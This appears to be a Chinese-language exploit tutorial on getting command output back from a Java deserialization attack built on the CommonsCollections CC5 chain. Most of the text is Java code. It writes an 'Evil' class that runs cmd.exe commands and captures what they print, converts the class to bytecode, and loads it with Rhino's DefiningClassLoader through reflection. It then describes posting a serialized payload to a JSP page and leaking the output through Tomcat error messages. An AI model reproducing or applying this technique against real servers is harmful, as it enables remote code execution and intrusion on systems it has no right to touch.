给这种方式增加点难度，要求回显命令执行的信息，先尝试普通的命令执行在console中回显。
Runtime.getRuntime().exec("ipconfig")是一个进程对象(process)，可以用getInputStream将结果转化为Stream。

package test;import java.io.*;
public class Test {    public static void main(String[] args) throws Exception {         Process process = Runtime.getRuntime().exec("cmd.exe /c "+"ipconfig");        InputStream in =  process.getInputStream();}}

Stream和字符串(String)有着很多种转化方法，我们百度一种出来。

package test;import java.io.*;
public class Test {    public static void main(String[] args) throws Exception {        Process process = Runtime.getRuntime().exec("cmd.exe /c "+"ipconfig");        InputStream in =  process.getInputStream();        BufferedReader br = new BufferedReader(new InputStreamReader(in));        String line;        StringBuilder sb = new StringBuilder();        while ((line = br.readLine()) != null) {        sb.append(line).append("\n");        }        String str = sb.toString();        System.out.println(str);}}


那么只要执行这个类的main方法就行了，但是回顾CC5的反序列化链，我们最终通过InvokerTransformer.transform()方法传入的只是通过反射的方式调用Runtime.getRuntime().exec()，如何传入任意类并执行main方法呢？也有很多种办法，这里我们使用defineClass方法，将字节码转换成class，其他方法参考  https://xz.aliyun.com/t/5257

首先，我们将这个回显POC写入Evil.class并且将方法改为exec

package test;import java.io.*;
public class  Evil {    public static void exec() throws Exception {        Process process = Runtime.getRuntime().exec("cmd.exe /c "+"ipconfig");        InputStream in =  process.getInputStream();        BufferedReader br = new BufferedReader(new InputStreamReader(in));        String line;        StringBuilder sb = new StringBuilder();        while ((line = br.readLine()) != null) {        sb.append(line).append("\n");        }        String str = sb.toString();        System.out.println(str);    }}

然后编译成Evil.class，文件转化为字节流(byte[])也是固定的写法。

package test;import java.io.*;
public class Test {    public static void main(String[] args) throws Exception {        FileInputStream inputFromFile = new FileInputStream("C:\\Users\\Administrator.K\\workspace\\test\\bin\\test\\Evil.class");        byte[] bs = new byte[inputFromFile.available()];        inputFromFile.read(bs);        for (int i = 0; i < bs.length; i++) {            System.out.print(bs[i]+",");        }    }}

现在bs就是Evil类的字节码形态了，defineClass是java.lang.ClassLoader里的方法，且属性为protected，利用起来较困难，所以一般使用org.mozilla.classfile.DefiningClassLoader类的defineClass方法，需要加载js.jar。
加载并执行exec方法如下

import org.mozilla.javascript.DefiningClassLoader;......
        DefiningClassLoader cls = new DefiningClassLoader();        Class cl = cls.defineClass("test.Evil", bs);        cl.getMethod("exec").invoke(cl.newInstance());

完全反射的利用方法如下

DefiningClassLoader.class.getDeclaredConstructor().newInstance().defineClass("test.Evil",bs).getMethod("exec").invoke(null);

那这样可以在test.jsp上反序列化然后看到回显信息吗？尝试一下，POST 1.ser到test.jsp。

答案当然是不行，只会在tomcat的console中看到，这不是我们想要的效果，不过反序列化任意类的目的得到了解决。我们不再是只能反序列化Runtime.getRuntime().exec()，而是任何写好的类都可以执行。
在实际情况中，如果tomcat开启了报错回显，我们可以将回显的字节流拼接进报错信息当中。
只需要将Evil类中System.out.println替换成throw new Exception即可。
